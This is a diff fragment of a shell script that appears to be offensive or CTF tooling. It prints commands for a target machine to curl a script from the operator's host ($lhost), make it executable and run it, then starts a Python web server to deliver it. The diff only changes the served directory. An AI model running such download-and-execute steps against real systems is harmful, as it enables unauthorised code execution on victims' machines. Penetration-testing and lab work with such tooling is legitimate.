@@ -14,7 +14,7 @@ echo "curl -OL http://"$lhost":80/linux/script/script_linux.sh"
 echo "chmod 700 script_linux.sh"
 echo "./script_linux.sh"
 
-cd /root/www
+cd /var/www/html/
 python3 -m http.server 80
 
 
